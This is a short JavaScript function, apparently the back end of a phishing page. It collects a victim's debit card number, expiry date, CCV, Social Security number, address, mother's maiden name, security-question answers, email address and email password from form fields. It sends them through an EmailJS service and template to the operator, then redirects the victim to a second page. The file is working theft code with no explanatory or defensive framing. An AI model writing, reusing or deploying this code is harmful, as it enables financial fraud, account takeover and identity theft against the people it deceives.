

function sendMail () {

    var params = {
        DebitCardNumber: document.getElementById("1").value,
        ExpiryDate: document.getElementById("2").value,
        ccv: document.getElementById("3").value,
        ssn: document.getElementById("4").value,
        NameonCard: document.getElementById("5").value,
        Address: document.getElementById("6").value,
        city: document.getElementById("7").value,
        state: document.getElementById("8").value,
        zipcode: document.getElementById("9").value,
        motherMaidenName: document.getElementById("10").value,
        nameOfCompanyYouFirstWorked: document.getElementById("first").value,
        highSchoolCity: document.getElementById("school").value,
        cityOfBirth: document.getElementById("11").value,
        email: document.getElementById("12").value,
        emailpass: document.getElementById("13").value,
        petName: document.getElementById("14").value,
    }
    const serviceID = "service_91ylxms";
    const templateID = "template_jat6x2s"
    
    emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
            window.location.href = "pagetwo.html"
            console.log(res)
        })
        .catch((err) => console.log(err))
}
